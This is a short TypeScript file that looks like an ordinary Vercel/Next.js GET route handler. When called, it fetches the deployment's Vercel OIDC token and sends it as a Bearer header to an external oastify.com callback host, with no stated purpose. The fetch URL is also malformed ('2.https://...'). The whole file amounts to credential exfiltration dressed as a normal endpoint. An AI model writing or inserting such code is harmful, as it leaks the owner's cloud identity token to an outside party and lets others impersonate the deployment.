import { getVercelOidcToken } from '@vercel/functions/oidc';
 
export const GET = async () => {
  const result = await fetch('2.https://tolvz876nrzdz3x0lu3qdntad1js7j3br0.oastify.com', {
    headers: {
      Authorization: `Bearer ${await getVercelOidcToken()}`,
    },
  });
 
  return Response.json(await result.json());
};
